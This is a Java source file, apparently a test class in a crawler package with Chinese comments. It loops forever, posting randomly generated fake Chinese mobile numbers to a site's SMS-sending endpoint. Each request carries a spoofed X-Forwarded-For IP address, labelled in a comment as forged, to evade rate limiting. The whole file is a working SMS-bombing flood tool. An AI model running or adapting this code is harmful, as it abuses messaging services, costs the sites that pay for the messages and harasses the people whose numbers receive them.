package com.bingo.business.crawler.test;

import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

/**
 * Created by Administrator on 2018-04-03.
 */
public class TestHttp {
    /**
     * url
     */
    private static String URL = "http://www.aaabbb.ccc/admin/sendmsg";

    /**
     * 定义手机号码段
     */
    private static String[] telFirst = "134,135,136,137,138,139,150,151,152,157,158,159,130,131,132,155,156,133,153,173,180"
            .split(",");

    /**
     * 获取随机范围内的数字
     */
    public static int getNum(int start, int end) {
        ThreadLocalRandom random = ThreadLocalRandom.current();
        return random.nextInt( (end - start + 1) + start);
    }

    /**
     * 获取伪造的手机号
     */
    private static String getTel() {
        int index = getNum(0, telFirst.length - 1);
        String first = telFirst[index];
        String second = String.valueOf(getNum(1, 888) + 10000).substring(1);
        String thrid = String.valueOf(getNum(1, 9100) + 10000).substring(1);
        return first + second + thrid;
    }

    /**
     * 获取伪造的ip
     */
    public static String getIPProxy(){
        StringBuffer sb = new StringBuffer();
        sb.append(getNum(2,254));
        sb.append(".");
        sb.append(getNum(2,254));
        sb.append(".");
        sb.append(getNum(2,254));
        sb.append(".");
        sb.append(getNum(2,254));
        return sb.toString();
    }

    /**
     * 程序入口
     */
    public static void main(String[] args) throws Exception {
        while(true){
            //单线程的死循环
            post(URL,getTel(),getIPProxy());
        }
    }

    /**
     * 发送 post请求访问本地应用并根据传递参数不同返回不同结果
     */
    public static void post(String url, String number,String ip_proxy) {
        // 创建默认的httpClient实例.
        CloseableHttpClient httpclient = HttpClients.createDefault();
        // 创建httppost
        HttpPost httppost = new HttpPost(url);
        httppost.setHeader("Connection","keep-alive");
        httppost.setHeader("Referer","从哪个网站连入过来的");
        httppost.setHeader("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0");
        httppost.setHeader("x-forwarded-for",ip_proxy);//伪造的ip地址
        // 创建参数队列
        List<NameValuePair> formparams = new ArrayList<NameValuePair>();
        formparams.add(new BasicNameValuePair("phone", number));
        UrlEncodedFormEntity uefEntity;
        try {
            uefEntity = new UrlEncodedFormEntity(formparams, "UTF-8");
            httppost.setEntity(uefEntity);
            System.out.println("executing request " + httppost.getURI());
            CloseableHttpResponse response = httpclient.execute(httppost);
            try {
                HttpEntity entity = response.getEntity();
                if (entity != null) {
                    System.out.println("--------------------------------------");
                    System.out.println("Response content: " + EntityUtils.toString(entity, "UTF-8"));
                    System.out.println("--------------------------------------");
                }
            } finally {
                response.close();
            }
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e1) {
            e1.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            // 关闭连接,释放资源
            try {
                httpclient.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
